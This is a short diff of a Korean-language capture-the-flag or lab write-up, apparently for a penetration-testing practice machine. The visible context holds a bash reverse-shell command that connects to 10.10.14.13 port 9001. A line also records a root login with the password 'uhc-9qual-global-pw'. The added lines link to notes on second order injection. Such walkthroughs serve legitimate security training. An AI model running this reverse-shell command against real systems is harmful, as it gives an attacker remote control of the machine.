@@ -125,3 +125,6 @@ cmd=bash -c 'bash -i >&/dev/tcp/10.10.14.13/9001 0>&1'
 
 - `uhc-9qual-global-pw` 비밀번호를 사용하여 `root` 로그인 시도하여 성공.
 <img width="1204" height="98" alt="image" src="https://github.com/user-attachments/assets/c4b0dfcd-c8fc-4952-8468-580c4afe5228" />
+
+---
+> `Second Order Injection` : https://github.com/jdh5772/Practice_Cyber_Security/blob/main/02-Database-Services.md#second-order-injection
